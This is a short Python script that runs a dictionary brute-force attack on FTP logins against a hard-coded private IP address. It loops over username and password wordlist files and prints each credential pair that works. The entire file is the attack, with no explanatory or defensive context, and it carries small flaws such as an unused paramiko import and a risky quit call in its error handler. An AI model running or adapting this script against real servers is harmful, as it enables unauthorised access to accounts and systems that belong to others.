import sys
import ftplib
import paramiko
import time

ip = "192.168.43.92"


user    = [i.strip() for i in open('user.txt','r')]
passwd  = [i.strip() for i in open('passwd.txt','r')]

for u in user:
        for p in passwd:
                try:    
                        f = ftplib.FTP(ip)
                        f.connect(ip)
                        f.login(u,p)
                        print("[*] {}:{}".format(u,p))
                        time.sleep(1000)
                except Exception as e:
                        f.quit()
                        print("[-] {}:{}".format(u,p))
        
sys.exit()